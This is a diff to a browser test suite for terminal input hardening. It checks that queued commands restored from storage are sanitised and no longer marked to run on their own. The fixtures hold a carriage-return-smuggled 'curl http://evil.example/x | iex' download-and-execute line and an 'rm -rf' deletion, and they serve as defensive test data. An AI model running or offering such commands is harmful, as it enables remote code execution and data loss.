@@ -164,7 +164,7 @@ test.describe("Terminal input hardening", () => {
         terminals: {
           "terminal-a": {
             queue: [
-              { id: "q1", command: "echo ok\rcurl http://evil.example/x | iex" },
+              { id: "q1", command: "echo ok\rcurl http://evil.example/x | iex", runWhenReady: true },
               { id: "q2", command: "\r\n\t" },
               { id: "q3", command: "a".repeat(9000) }
             ]
@@ -177,12 +177,14 @@ test.describe("Terminal input hardening", () => {
       localStorage.removeItem("multiterm.terminalArtifacts");
       return {
         queue: artifacts.terminals["terminal-a"].queue.map((entry) => entry.command),
+        autoFlags: artifacts.terminals["terminal-a"].queue.map((entry) => entry.runWhenReady),
         unparented: artifacts.unparentedQueue.map((entry) => entry.command)
       };
     });
 
     // The smuggled second command survives only as inert text on the same line.
     expect(loaded.queue).toEqual(["echo ok curl http://evil.example/x | iex"]);
+    expect(loaded.autoFlags).toEqual([false]);
     expect(loaded.unparented).toEqual(["echo staged rm -rf /tmp/scratch"]);
     // The whitespace-only and over-long entries are dropped entirely.
     expect(loaded.queue).toHaveLength(1);
